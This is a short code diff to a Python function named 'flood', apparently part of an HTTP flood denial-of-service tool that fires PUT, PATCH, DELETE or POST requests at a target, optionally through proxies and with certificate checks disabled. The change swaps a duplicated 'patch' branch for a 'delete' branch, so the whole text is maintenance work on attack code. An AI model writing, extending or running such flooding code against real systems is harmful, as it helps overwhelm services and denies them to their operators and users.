@@ -54,8 +54,8 @@ def flood(target,domainname,attack,sock):
                 r = s.put(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             elif attack =='patch':
                 r = s.patch(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
-            elif attack =='patch':
-                r = s.patch(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
+            elif attack =='delete':
+                r = s.delete(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
             else:
                 r = s.post(target,params=payload ,headers=headers, timeout=4 , verify=False,proxies=proxies)
         else:
@@ -67,8 +67,8 @@ def flood(target,domainname,attack,sock):
                 r = s.put(target, params=payload, headers=headers, timeout=20 ,verify=False)
             elif attack =='patch':
                 r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
-            elif attack =='patch':
-                r = s.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
+            elif attack =='delete':
+                r = s.delete(target, params=payload, headers=headers, timeout=20 ,verify=False)
             else:
                 r = s.post(target,params=payload ,headers=headers, timeout=20 , verify=False)
 
